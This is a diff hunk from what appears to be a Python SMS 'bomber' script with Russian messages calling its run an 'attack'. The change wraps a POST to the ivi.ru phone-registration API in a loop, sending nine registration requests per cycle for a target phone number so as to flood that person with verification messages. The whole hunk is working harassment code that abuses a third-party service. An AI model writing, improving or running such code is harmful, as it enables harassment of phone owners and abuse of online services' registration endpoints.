@@ -3204,10 +3204,13 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
-            R = R + 1
-            print('[+] IVI отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
+            i = 0
+            while i < 9:
+                requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
+                R = R + 1
+                i = i + 1
+                print('[+] IVI отправлено! || Кол-во - ' + str(R))
+                time.sleep(0.1)
         except:
             print('[-] не отправлено!')
         if time.time() > start_time + float(CLOSE_AFTER):
